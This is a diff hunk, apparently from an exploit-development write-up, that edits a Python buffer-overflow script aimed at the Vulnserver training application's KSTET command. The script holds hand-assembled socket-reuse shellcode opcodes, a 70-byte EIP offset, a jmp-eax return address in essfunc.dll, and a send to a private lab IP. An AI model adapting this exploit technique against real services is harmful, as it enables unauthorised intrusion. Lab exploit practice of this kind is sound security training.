@@ -369,28 +369,30 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating File Descriptor = 0x00000088
-crash += "\x31\xc9"			    # xor ecx, ecx
+# Creating File Descriptor
+crash += "\x31\xc9"			# xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				      # push ecx
-crash += "\x89\xe7"			    # mov edi, esp
+crash += "\x51"				# push ecx
+crash += "\x89\xe7"			# mov edi, esp
 
 # Move ESP out of the way
 crash += "\x83\xec\x50"			# sub esp, 0x50
 
-# Flags = 0x00000000
+# Flags
 crash += "\x31\xd2"
-crash += "\x52"				      # push edx
+crash += "\x52"				# push edx
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"	# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("172.16.55.143", 9999))
 
 s.send(command+crash)
+
+
 
 ```
 
